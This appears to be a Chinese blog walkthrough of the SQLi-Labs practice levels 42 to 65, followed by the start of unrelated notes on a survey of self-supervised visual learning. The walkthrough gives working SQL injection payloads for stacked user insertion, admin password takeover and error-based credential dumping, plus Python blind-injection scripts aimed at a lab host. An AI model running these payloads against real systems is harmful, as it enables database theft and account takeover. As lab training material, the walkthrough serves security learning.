<p>payload:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>先利用payload尝试登陆，虽然显示登陆失败，但实际上堆叠注入的语句已经执行，然后再用账户密码均为<code>Lethe</code>的账户进行登陆，发现可以登陆成功。<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724215904736.png" alt="在这里插入图片描述"></p>
<p>如果还希望越权的话，原理参考<strong>less-24</strong>，构造<code>1&#39;;insert into users(id,username,password) values(&quot;25&quot;,&quot;admin&#39;#&quot;,&quot;123&quot;)#</code>，这样就插入可用户名为<code>admin&#39;#</code>，密码为<code>123</code>的用户，登陆此账号：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724220536354.png" alt="在这里插入图片描述"><br>然后用此账号进行修改密码，实际上修改了用户<code>admin</code>的密码。<br><br></p>
<h4 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h4><p>与less-42一样，区别是这里用<code>(&#39;$password&#39;)</code>闭合。</p>
<p>payload：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h4><p>好像和less-42一样…</p>
<p>payload:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h4><p>好像和less-43一样…</p>
<p>payload:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Username：任意</span><br><span class="line">Password：1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'20'</span>,<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h4><p>order by注入，<code>?id=1 desc</code>和<code>?id=1 asc</code>返回的数据有区别说明可以进行注入。</p>
<ul>
<li>这一关会回显错误，因此可以采用报错注入。</li>
<li>除此之外，<code>rand(true)</code>和<code>rand(false)</code>返回的结果也不一样，可以利用这一点进行布尔盲注。</li>
<li>还有一种盲注的方法，即类似<code>?sort=id ^(select(select version()) regexp &#39;^5&#39;)</code>，原理就是就是在<code>regexp</code>正则匹配的时候，如果匹配到数据返回1(00000001)的时候，此时的1会和id中的数据的二进制进行异或，按照异或的结果进行升序排列，所以显示的排列会发生变化；反之当进行正则匹配的时候，未匹配到数据返回0(00000000)，此时数字和0异或的结果还是本身，所以显示的排列不会发生改变，所以可以布尔盲注，逐个猜解数据，当页面<strong>排序紊乱</strong>时则说明匹配正确，页面排序<strong>未发生紊乱</strong>时则说明匹配错误。</li>
<li>也可以通过类似<code>?sort=1 and (if((ascii(substr((select database() limit 0,1),1,1))=115),sleep(5),1))–+</code>进行时间盲注</li>
<li>导入导出文件into outfile参数也可以</li>
</ul>
<p>这里采用报错注入，payload：(报错字数有限，可修改limit的值逐条读出数据)<br><code>?sort=1 and extractvalue(1,concat(0x7e,( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1),0x7e))</code></p>
<p><br></p>
<h4 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h4><p>单引号闭合sort，其他的与上一关一样。</p>
<p>payload：<br><code>?sort=1&#39; and extractvalue(1,concat(0x7e,( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1),0x7e))--+</code><br><br></p>
<h4 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h4><p>这一关原理同less-46，但是不会回显报错信息，所以不能使用报错注入。</p>
<p>采用时间盲注，脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># less-48</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-48/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?sort=1 and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)"</span></span><br><span class="line">        <span class="comment"># payload = f"?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)"</span></span><br><span class="line">        payload = <span class="string">f"?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(3),1)"</span>       </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h4><p>同less-47单引号闭合，但是不能回显报错信息，所以还是采用时间盲注，脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># less-49</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-49/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?sort=1' and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)--+"</span></span><br><span class="line">        <span class="comment"># payload = f"?sort=1' and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(3),1)--+"</span></span><br><span class="line">        payload = <span class="string">f"?sort=1' and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(3),1)--+"</span>       </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h4><p>这一关是order by与堆叠注入结合，数字型，无闭合。</p>
<p>payload:<br><code>?sort=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code></p>
<p>执行完上面payload后再<code>?sort=1</code>可以看到多出来一行数据<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190726162456290.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h4><p>与上一关的区别是这里用单引号进行了闭合。</p>
<p>payload：<br><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
<h4 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h4><p>和less-50一样，只是不会回显错误，堆叠注入方式相同。</p>
<p>payload：<br><code>?sort=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
<h4 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h4><p>和less-51一样，只是不会回显错误，堆叠注入方式相同。</p>
<p>payload：<br><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;lethe&#39;,&#39;lethe&#39;)--+</code><br><br></p>
<h4 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h4><p>限制了只能在10次请求以内完成注入，且每次重置会生成随机的表名、列名和数据。</p>
<p>payload:<br><code>?id=1&#39;</code></p>
<p><code>?id=1&#39;--+</code></p>
<p><code>?id=1&#39; order by 3--+</code></p>
<p><code>?id=1&#39; order by 4--+</code></p>
<p><code>?id=-1&#39; union select 1,2,3--+</code></p>
<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名3UXZWY1KY9</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;3UXZWY1KY9&#39;),3--+</code><br>得到四个列名id,sessid,secret_7RZ7,tryy</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(secret_7RZ7) from 3UXZWY1KY9),3--+</code><br>得到数据VWKFpeoXofNsCqqxcfWGM9x7，并提交<br><br></p>
<h4 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h4><p>这里比上一关多给了四次机会，得先花不少次猜测闭合方式，按照前面提到的顺序，先猜单双引号和单独括号，然后在单双引号后逐个添加括号，一般最多两个括号，若有报错信息同时要关注报错的信息来进行判断。</p>
<p>本关闭合方式为：<code>($id)</code>知道了闭合方式后其他的和上一关就一样了。</p>
<p>payload:</p>
<p><strong>······</strong></p>
<p><code>?id=-1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名P6BV60ROT2</p>
<p><code>?id=-1) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;P6BV60ROT2&#39;),3--+</code><br>得到四个列名id,sessid,secret_EWSR,tryy</p>
<p><code>?id=-1) union select 1,(select group_concat(secret_EWSR) from P6BV60ROT2),3--+</code><br>得到数据Pwh5inh7TxaAV10IZRCc26MW<br><br></p>
<h4 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h4><p>闭合方式为：<code>(&#39;$id&#39;)</code>，其他的和上面一样。</p>
<p>payload:</p>
<p><strong>······</strong></p>
<p><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名QS5C6XI6F0</p>
<p><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;QS5C6XI6F0&#39;),3--+</code><br>得到四个列名id,sessid,secret_PYBQ,tryy</p>
<p><code>?id=-1&#39;) union select 1,(select group_concat(secret_PYBQ) from QS5C6XI6F0),3--+</code><br>得到数据bHnjS8Y6KtGQDTihKBCDG7sU<br><br></p>
<h4 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h4><p>闭合方式为：<code>&quot;$id&quot;</code>，其他的和上面一样。</p>
<p>payload:</p>
<p><strong>······</strong></p>
<p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br>得到表名9ODZ61QBP1</p>
<p><code>?id=-1&quot; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;9ODZ61QBP1&#39;),3--+</code><br>得到四个列名id,sessid,secret_Z0TV,tryy</p>
<p><code>?id=-1&quot; union select 1,(select group_concat(secret_Z0TV) from 9ODZ61QBP1
),3--+</code><br>得到数据0MNZ3yAJ3N0XuSZIlYhrGbcj<br><br></p>
<h4 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h4><p>单引号闭合，但是只有五次机会。</p>
<p>但是尝试<code>?id=-1&#39; union select 1,2,3--+</code>时发现页面无法回显sql语句的结果，所以前面几关的方法不能用了，但是页面会回显错误信息，所以考虑报错注入。</p>
<p>payload:</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名AK0HRXW75I</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;AK0HRXW75I&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_RPHD,tryy</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(secret_RPHD) from AK0HRXW75I),0x7e))--+</code><br>得到数据7wEINBWYdYvusRUrsV9bidFL</p>
<p><br></p>
<h4 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h4><p>这一关为数字型，未进行闭合，其他的与less-58相同。</p>
<p>payload:</p>
<p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名NTGAY0ES0F</p>
<p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;NTGAY0ES0F&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_9Y69,tryy</p>
<p><code>?id=-1 and extractvalue(1,concat(0x7e,(select group_concat(secret_9Y69) from NTGAY0ES0F),0x7e))--+</code><br>得到数据UpD0J8a6Q7RFjeMejjCujser</p>
<p><br></p>
<h4 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h4><p>经测试，闭合方式为：<code>(&quot;$id&quot;)</code>，其他与前两关相同。</p>
<p>payload:</p>
<p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名HJ31CD4SZJ</p>
<p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;HJ31CD4SZJ&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_L5OI,tryy</p>
<p><code>?id=-1&quot;) and extractvalue(1,concat(0x7e,(select group_concat(secret_L5OI) from HJ31CD4SZJ),0x7e))--+</code><br>得到数据RbCnjPhpQjy7psK1DXG1IL78</p>
<p><br></p>
<h4 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h4><p>经测试，闭合方式为：<code>((&#39;$id&#39;))</code>，其他与前两关相同。</p>
<p>payload:</p>
<p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</code><br>得到表名S0EAHB4X1I</p>
<p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;S0EAHB4X1I&#39;),0x7e))--+</code><br>得到四个列名id,sessid,secret_5AJ4,tryy</p>
<p><code>?id=-1&#39;)) and extractvalue(1,concat(0x7e,(select group_concat(secret_5AJ4) from S0EAHB4X1I),0x7e))--+</code><br>得到数据5SIpSyz03MhX52krjGbqHot7</p>
<p><br></p>
<h4 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h4><p>经测试，闭合方式为：<code>(&#39;$id&#39;)</code>，这一关既不回显sql语句结果，也不回显错误信息，那就只能盲注了，要求是130次请求以内完成盲注。</p>
<p>下面关键就是如何减少请求的次数了…</p>
<p>那么首先，如果能知道跑出的数据，长度为多少肯定是最好的，就没必要进行多余的爆破了…</p>
<ul>
<li>前面几关可以发现随机的表名长度是固定的(长度为10)，这里也可以手工测试或写个脚本跑一下，这一阶段只是为了知道长度，之后可以进行重置。</li>
<li>在跑列名的时候，我们实际上只需要secret_XXXX这一列的列名，因此可以用<code>limit 2,1</code>之筛选出这个列名，甚至我们只需要跑出最后那随机的4位即可，前面的<code>secret_</code>是都一样的。</li>
<li>最后在注入出数据，发现数据也是固定的24位长度。</li>
</ul>
<p>除此之外，我前面的脚本都是采取顺序爆破的，这样更方便一点，但这里可以采用二分法来进行盲注，可以减少请求的次数。</p>
<p>脚本如下：</p>
<p>（1）表名：（已测试出表名长度为10）<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-62/'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">payloads = list(range(<span class="number">48</span>,<span class="number">58</span>))+list(range(<span class="number">65</span>,<span class="number">91</span>))  <span class="comment"># 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high =<span class="number">35</span></span><br><span class="line">    <span class="comment"># high = 61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        payload = <span class="string">f"?id=1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+"</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Angelina'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += chr(payloads[high])</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
<p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190726212918224.png" alt="在这里插入图片描述"></p>
<p>（2）列名：（只爆破最后随机的4位）<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-62/'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">payloads = list(range(<span class="number">48</span>,<span class="number">58</span>))+list(range(<span class="number">65</span>,<span class="number">91</span>))  <span class="comment"># 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))+list(range(97,123))   # 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">12</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high =<span class="number">35</span></span><br><span class="line">    <span class="comment"># high = 61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        <span class="comment"># payload = f"?id=1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+" </span></span><br><span class="line">        payload = <span class="string">f"?id=1') and ascii(substr((select column_name from information_schema.columns where table_name='1X6T9FDAIW' limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+"</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Angelina'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += chr(payloads[high])</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
<p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/2019072621292983.png" alt="在这里插入图片描述"><br>（3）最后的数据：（已知长度为24）<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-62/'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = list(range(48,58))+list(range(65,91))  # 大写字母和数字的ascii，len=36</span></span><br><span class="line"></span><br><span class="line">payloads = list(range(<span class="number">48</span>,<span class="number">58</span>))+list(range(<span class="number">65</span>,<span class="number">91</span>))+list(range(<span class="number">97</span>,<span class="number">123</span>))   <span class="comment"># 大写字母、小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>): </span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    <span class="comment"># high =35</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]</span><br><span class="line">        <span class="comment"># payload = f"?id=1') and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+" </span></span><br><span class="line">        <span class="comment"># payload = f"?id=1') and ascii(substr((select column_name from information_schema.columns where table_name='1X6T9FDAIW' limit 2,1),&#123;i&#125;,1))&gt;&#123;m&#125;--+" </span></span><br><span class="line">        payload = <span class="string">f"?id=1') and ascii(substr((select group_concat(secret_SQOB) from 1X6T9FDAIW),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+"</span> </span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Angelina'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += chr(payloads[high])</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
<p>结果：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190726212950480.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h4><p>闭合方式为：<code>&#39;$id&#39;</code>，其他的与less-62相同。</p>
<p><br></p>
<h4 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h4><p>闭合方式为：<code>(($id))</code>，其他的与less-62相同。</p>
<p><br></p>
<h4 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h4><p>闭合方式为：<code>(&quot;$id&quot;)</code>，其他的与less-62相同。</p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>【论文笔记——自监督学习综述】Self-supervised Visual Feature Learning with Deep Neural Networks：A Survey</title>
    <url>/2020/10/11/%E3%80%90%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E8%87%AA%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%E7%BB%BC%E8%BF%B0%E3%80%91Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/</url>
    <content><![CDATA[<p>arxiv：<a href="https://arxiv.org/abs/1902.06162" target="_blank" rel="noopener">https://arxiv.org/abs/1902.06162</a></p>
<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1 介绍"></a>1 介绍</h2><h4 id="1-1-动机"><a href="#1-1-动机" class="headerlink" title="1.1 动机"></a>1.1 动机</h4><p>（1）Deep ConvNets 的性能很大程度上取决于它的 capability 和数据集的数量，但是大规模数据集的收集和注释非常昂贵。</p>
<p>（2）因此近年来提出了许多 self-supervised learning 的方法，即从大规模无标记的数据中自主的学习特征。采取的方法通常是设置一些 pretext tasks（如图像上色、图像修补、图像拼接等），训练网络去解决 pretext tasks，在完成这些任务的过程中，网络就学习到了相应的特征，从而生成对应的伪标签（pseudo label）。</p>
<p>（3）pretext task需要满足以下两个条件：</p>
<ul>
<li>ConvNets 需要捕获图片/视频中的 visual features 来解决 pretext tasks</li>
<li>可以根据图像/视频的某些属性自动生成用于 pretext task 的伪标签</li>
</ul>
<p><img src="/2020/10/11/【论文笔记——自监督学习综述】Self-supervised-Visual-Feature-Learning-with-Deep-Neural-Networks-A-Survey/image-20200928163803414.png" alt="Fig.1"></p>
<p>self-supervised learning 的一般流程：</p>
<ul>
<li>首先，设计一个预定义的前置任务（pretext task），训练网络来解决改任务，根据数据的某些属性自动生成前置任务下的伪标签。</li>
<li>然后，训练 ConvNet 学习 pretext task 的目标函数（object functions），当 pretext task 训练完成后，学习到的视觉特征可以被进一步迁移到下游任务中，从而提高性能并减少过拟合。</li>
<li>通常来说，浅层捕获一些低级特征，如边缘、拐角和纹理，而较深层捕获与任务相关的高级特征。因此，在受监督的下游任务训练阶段，只是转移了前几层的视觉特征。</li>
</ul>
<h4 id="1-2-术语定义"><a href="#1-2-术语定义" class="headerlink" title="1.2 术语定义"></a>1.2 术语定义</h4><p>（1）术语解释：</p>
<ul>
<li><strong>Human-annotated label：</strong>由人工进行注释的数据标签。</li>
<li><strong>Pseudo Label：</strong>基于用于 pretext task 的数据属性自动生成的标签。</li>
<li><strong>Pretext Task：</strong>预先设计的让网络进行解决的任务，通过学习 pretext task 的目标函数（object functions）可以让网络自动学习的数据的视觉特征。</li>
<li><strong>Downstream Task：</strong>用来评估自监督学习到特征的质量的计算机视觉应用程序。通常需要人工注释的标签来解决下游任务，但在某些情况下，下游任务可以与前置任务相同，这样就无需任何人工注释标签。</li>
<li><strong>Supervised Learning：</strong>监督学习，用带有细粒度的人工注释标签来训练网络的学习方法。</li>
<li><strong>Semi-supervised Learning：</strong>半监督学习，用少量标记数据和大量的未标记数据来训练网络的学习方法。</li>
<li><strong>Weakly-supervised Learning：</strong>弱监督学习，用粗粒度或不准确的标签进行训练的学习方法，粗粒度标签的获取成本比细粒度低很多。</li>
<li><strong>Unsupervised Learning：</strong>无监督学习，不适用任何人工注释标签的学习方法。</li>
<li><strong>Self-supervised Learning：</strong> 自监督学习，使用自动生成的标签对 ConvNets 进行训练的学习方法。（本文仅关注视觉特征相关的方法）</li>
</ul>
<p>（2）文章主要贡献：</p>
<ul>
<li>首次有关 Deep ConvNets 的自监督视觉特征学习的综述。</li>
<li>对最近自监督学习的方法和数据集进行回顾。</li>
<li>对现有的方法的性能进行定量的分析和比较。</li>
<li>指出了自监督学习未来可能的方向。</li>
</ul>
<h2 id="2-不同的学习模式"><a href="#2-不同的学习模式" class="headerlink" title="2 不同的学习模式"></a>2 不同的学习模式</h2><p>下面将对有监督、无监督（自监督学习看作无监督学习的子类）、弱监督和半监督四种视觉特征学习方法进行比较。</p>
<h4 id="2-1-监督学习"><a href="#2-1-监督学习" class="headerlink" title="2.1 监督学习"></a>2.1 监督学习</h4><p>监督学习损失函数定义如下：</p>


$$
\operatorname{loss}(D)=\min _{\theta} \frac{1}{N} \sum_{i=1}^{N} \operatorname{loss}\left(X_{i}, Y_{i}\right)
$$


<p>$N$为数据集数量，$X_i$为数据集中的一个数据，$Y_i$为其对应的人工标注的标签:</p>
<ul>
<li><p>优点：标签精确，效果好，取得了突破性成果。</p>
</li>
<li><p>缺点：数据收集和注释昂贵，需要耗费大量人力物力。</p>
</li>
</ul>
<h4 id="2-2-半监督学习"><a href="#2-2-半监督学习" class="headerlink" title="2.2 半监督学习"></a>2.2 半监督学习</h4><p>半监督学习的损失函数如下：<br>

$$
\operatorname{loss}\left(D_{1}, D_{2}\right)=\min _{\theta} \frac{1}{N} \sum_{i=1}^{N} \operatorname{loss}\left(X_{i}, Y_{i}\right)+\frac{1}{M} \sum_{i=1}^{M} \operatorname{loss} \left(Z_{i}, R\left(Z_{i}, X\right)\right)
$$

<br>$X$表示少量的有标签数据集（数据集大小为$N$，表示为$D_1$），其中每个$X_i$对应的人工注释的标签为$Y_i$；$Z$表示大量的无标签数据集（数据集大小为$M$，表示为$D_2$）。</p>
<p>$R(Z_i,X)$是一个针对某个特定的任务的函数，用来表示无标签数据$Z_i$与有标签数据$X$之间的关系。</p>
